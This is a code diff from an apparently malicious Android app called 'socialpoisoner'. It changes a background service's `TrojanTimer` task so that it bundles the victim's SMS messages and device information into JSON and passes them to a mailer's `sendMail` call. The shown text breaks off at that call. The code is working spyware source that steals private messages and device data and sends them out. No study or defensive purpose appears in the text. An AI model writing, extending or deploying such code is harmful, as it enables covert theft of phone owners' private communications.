@@ -10,6 +10,8 @@ import com.cakeman.doctorrabb.socialpoisoner.modules.mailer;
 import com.cakeman.doctorrabb.socialpoisoner.modules.messageBuilder;
 import com.cakeman.doctorrabb.socialpoisoner.modules.constants;
 
+import org.json.JSONObject;
+
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -44,8 +46,18 @@ public class srv extends Service {
     class TrojanTimer extends TimerTask {
         public void run () {
             Dumper dumper = new Dumper();
-            messageBuilder messageBuilder = new messageBuilder(dumper.dumpSMS (getApplicationContext()));
-            Log.d ("Html output", messageBuilder.buildToHtml());
+            messageBuilder messageBuilder = null;
+            try {
+
+                messageBuilder = new messageBuilder(new JSONObject ().put ("info",
+                        dumper.dumpInfo(getApplicationContext())).put ("sms",
+                        dumper.dumpSMS(getApplicationContext())));
+
+            } catch (Exception e) {
+                Log.e ("Dump All Error", e.getMessage());
+            }
+
+            Log.d ("Device Information", dumper.dumpInfo(getApplicationContext()).toString());
 
             mailer m = new mailer ();
             m.sendMail (
